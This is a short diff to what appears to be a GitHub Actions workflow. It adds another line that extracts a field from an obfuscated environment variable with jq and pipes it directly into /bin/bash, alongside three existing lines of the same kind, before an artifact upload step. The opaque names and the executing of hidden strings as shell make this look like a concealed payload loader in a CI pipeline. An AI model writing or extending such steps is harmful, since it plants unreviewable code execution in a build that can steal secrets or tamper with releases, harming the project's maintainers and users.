@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$xxs0" | jq -r .ul34211 | /bin/bash
           echo $tkkb000 | jq -r .jnq6 | /bin/bash
           echo $wzm2 | jq -r .ecrm244 | /bin/bash
+          printf '%s' "$acegt150" | jq -r .rys8392 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
